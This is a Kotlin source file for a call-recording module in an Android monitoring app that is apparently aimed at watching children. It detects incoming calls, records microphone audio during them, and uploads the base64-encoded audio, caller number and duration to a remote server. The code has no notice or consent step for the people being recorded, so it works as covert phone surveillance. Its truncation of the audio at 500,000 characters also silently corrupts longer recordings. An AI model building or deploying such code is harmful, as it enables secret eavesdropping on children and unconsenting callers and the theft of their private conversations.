package com.example.kidsguardchild.modules

import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.CallLogBody
import com.example.kidsguardchild.core.CallRecordingBody
import com.example.kidsguardchild.core.DataUploader
import kotlinx.coroutines.*
import java.io.File
import android.util.Base64
import java.util.concurrent.TimeUnit

private const val TAG = "CallRecordingModule"

/**
 * Detects phone calls and attempts ambient recording during active calls.
 * Note: Many Android 10+ devices block true in-call audio capture for third-party apps.
 */
class CallRecordingModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var listener: PhoneStateListener? = null
    private var recorder: MediaRecorder? = null
    private var recordFile: File? = null
    private var callStartMs = 0L
    private var incomingNumber: String? = null
    private var isIncoming = false

    @Suppress("DEPRECATION")
    fun start() {
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "READ_PHONE_STATE not granted")
            return
        }
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        listener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> {
                        isIncoming = true
                        incomingNumber = phoneNumber ?: "Unknown"
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        callStartMs = System.currentTimeMillis()
                        if (isIncoming) startRecordingAttempt()
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        stopRecordingAndUpload()
                        isIncoming = false
                    }
                }
            }
        }
        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
        Log.i(TAG, "Call recording listener active")
    }

    fun stop() {
        listener?.let {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION")
            tm.listen(it, PhoneStateListener.LISTEN_NONE)
        }
        listener = null
        stopRecordingAndUpload()
    }

    private fun startRecordingAttempt() {
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) return
        try {
            recordFile = File(context.cacheDir, "call_${System.currentTimeMillis()}.m4a")
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(recordFile!!.absolutePath)
                prepare()
                start()
            }
            Log.d(TAG, "Recording started (MIC during call)")
        } catch (e: Exception) {
            Log.w(TAG, "Could not start call recording: ${e.message}")
        }
    }

    private fun stopRecordingAndUpload() {
        scope.launch {
            val durationMs = if (callStartMs > 0) System.currentTimeMillis() - callStartMs else 0
            val durationStr = formatDuration(durationMs / 1000)
            var audioUrl: String? = null
            try {
                recorder?.apply {
                    stop()
                    release()
                }
            } catch (_: Exception) {
            }
            recorder = null
            recordFile?.let { f ->
                if (f.exists() && f.length() > 1000) {
                    val b64 = Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
                    audioUrl = "data:audio/mp4;base64,${b64.take(500_000)}" // cap size for API
                }
                f.delete()
            }
            recordFile = null
            callStartMs = 0

            if (isIncoming || incomingNumber != null) {
                val name = incomingNumber ?: "Unknown"
                DataUploader.upload("CallRecording") {
                    ApiClient.service.postCallRecording(
                        CallRecordingBody(
                            name = name,
                            phone = name,
                            type = "Incoming",
                            duration = durationStr,
                            audioUrl = audioUrl,
                            hasAudio = audioUrl != null
                        )
                    )
                }
                DataUploader.upload("CallLog") {
                    ApiClient.service.postCallLog(
                        CallLogBody(contact = name, number = name, type = "Incoming", duration = durationStr)
                    )
                }
            }
            incomingNumber = null
        }
    }

    private fun formatDuration(sec: Long): String {
        val m = sec / 60
        val s = sec % 60
        return "%02d:%02d".format(m, s)
    }
}
